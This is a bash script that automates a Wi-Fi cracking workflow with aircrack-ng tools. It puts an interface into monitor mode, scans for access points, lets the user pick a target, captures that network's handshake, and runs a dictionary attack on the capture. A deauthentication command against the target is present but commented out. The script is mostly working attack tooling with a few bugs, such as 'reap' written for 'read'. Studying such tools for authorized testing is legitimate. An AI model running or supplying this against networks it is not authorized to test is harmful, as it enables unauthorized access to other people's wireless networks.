choose_interface(){
    declare -a interfaces=()
    while read line; do
        if [[ $line =~ wlan([0-9]+) ]]; then
            num=${BASH_REMATCH[1]}
            face='wlan'$num
            if [[ $line =~ "mon" ]]; then
                face+=mon
            fi
            interfaces+=($face)
        fi
    done < <(airmon-ng)

    PS3='Enter your choice of interface: '
    select opt in "${interfaces[@]}"
    do
        interface=$opt
        if [[ ! $interface =~ "mon" ]]; then
            #Have to do this, else the return value 
            #of this function will contain the result from these two
            _=$(airmon-ng check kill)
    	    _=$(airmon-ng start $interface)
            interface+=mon
        fi
        break
    done

    echo $interface
}

scan() {
    interface=$(choose_interface)
    echo "[*] Removing old scans"
    if [ $(ls -1 *.csv 2>/dev/null | wc -l) != 0 ]; then
        rm *.csv
    fi
    
    read -p "[*] Stop this process after a few seconds [Enter]" nothing
    xterm -e "airodump-ng $interface -w 'scan' --output-format csv"
    
}

target() {
    
    interface=$(choose_interface)

    OLDIFS=$IFS; IFS=','

    COUNT=1
    while read line; do
        arr=($line)
        if [[ "${arr[0]}" =~ "Station MAC" ]]; then
            break
        fi
        if [[ ! ${arr[13]} == " " ]]; then
            echo "$COUNT ${arr[13]} ${arr[3]} ${arr[5]} ${arr[8]} ${arr[0]}"
        fi
        COUNT=$((COUNT+1))
    done < scan-01.csv
    
    read -p "Enter the num to target: " targ
    targ+="q;d" && t=$(sed "$targ" scan-01.csv) && target=($t)
    IFS=$OLDIFS

    read -p "Deauth[y/n] " deauth
    if [ $deauth == "y" ]; then
        echo "Pop another x-term to deauth"
        #xterm -e bash -c "aireplay-ng -0 0 -a ${target[0]} $interface"
    fi

    xterm -e bash -c "airodump-ng --channel ${target[3]} --bssid ${target[0]} $interface -w 'crack' --output-format pcap"
    
}

crack() {
    read -p "[*] Do you want to make a wordlist [y/n] " wordlist
    if [ $wordlist == "y" ]; then
        read -p "[*] Filename " filename
        # Use John the Ripper || Crunch
        reap -p "[*] Crunch command?" crunch
        $crunch
    fi

    read -p "[*] Do you use a wordlist [y/n] " wordlist
    if [ $wordlist == "y" ]; then
        read -p "[*] Filename " filename
    fi
    find *.cap
    read -p "[*] Capfile " capfile
    aircrack-ng "$capfile" -w "$filename"
}

quit() {
    while read line; do
        if [[ $line =~ wlan([0-9]+) ]]; then
            num=${BASH_REMATCH[1]}
            face='wlan'$num
            if [[ $line =~ "mon" ]]; then
                face+=mon
                airmon-ng stop "$face"
            fi
        fi
    done < <(airmon-ng)

    ifconfig wlan0 down
    ifconfig wlan0 up
    service network-manager restart

    exit
}

show_menu(){
    clear
    prompt='Enter your choice: '
    options=("scan" "target" "crack" "quit")

    if [ ! -f 'scan-01.csv' ]; then
        options=("scan" "quit")
    fi

    if [ -f 'crack-01.cap' ]; then
        options+="crack"
    fi

    PS3="$prompt"
    select opt in "${options[@]}";
    do
        case $opt in
            "scan") 
                echo "you scan"            
                scan
                break
            ;;
            "target") 
                echo "you target"
                target
                break
            ;;
            "crack") 
                echo "you crack"
                crack
                break
            ;;
            "quit")
                quit
                ;;
            *) echo invalid option
            ;;
        esac
    done
}

while true
do
    show_menu
done
